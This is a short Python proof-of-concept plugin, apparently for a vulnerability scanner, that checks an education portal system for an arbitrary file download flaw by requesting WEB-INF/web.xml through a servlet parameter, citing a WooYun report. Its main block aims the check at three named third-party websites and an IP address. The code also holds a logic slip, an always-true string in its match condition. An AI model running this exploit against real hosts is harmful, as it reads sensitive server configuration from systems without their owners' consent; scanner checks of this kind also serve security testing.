#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:浙大万鹏某通用教育类门户系统存在任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-072693

def assign(service,arg):
    if service=="zdsoft_cnet":
        return True,arg 
    
def  audit(arg):
    url=arg+"cnet/servlet/servletupload?domesticfile=WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and  "<?xml version=" and "<web-app>" in res: 
           
        security_hole(url)   

if __name__=="__main__":
    from dummy import *
    audit(assign('zdsoft_cnet','http://www.ytzk.cn/')[1])
    audit(assign('zdsoft_cnet','http://www.changjun.com.cn:81/')[1])
    audit(assign('zdsoft_cnet','http://221.10.59.18:8080/')[1])